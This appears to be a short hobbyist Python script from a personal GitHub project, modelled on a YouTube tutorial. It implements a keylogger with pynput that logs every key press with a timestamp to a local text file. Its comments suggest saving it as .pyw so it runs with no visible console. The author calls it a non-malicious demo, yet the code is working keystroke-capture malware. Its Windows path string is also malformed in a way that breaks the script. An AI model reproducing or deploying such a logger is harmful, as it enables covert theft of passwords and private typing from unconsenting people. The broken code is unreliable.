#There are many tutorials of this on youtube, so I decided I would try it out for myself and get an introduction to a more standard programming language than a specific one such as powershell. This specific keylogger
#follows David Bombals video and simply records each key press along with the date/time they were pressed.

#Change file format to .pyw to get the file to run without a console or .py to run with console. Not for malicious purposes, simply a short demo.

#![image](https://github.com/JMacPort/PythonProjects/assets/145376972/21c9051d-1bb6-41a0-bb05-df824b5bb26d)

from pynput.keyboard import Key, Listener
import logging

log_dir = "C:\Users\j\Desktop\Hmm"

logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
    level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
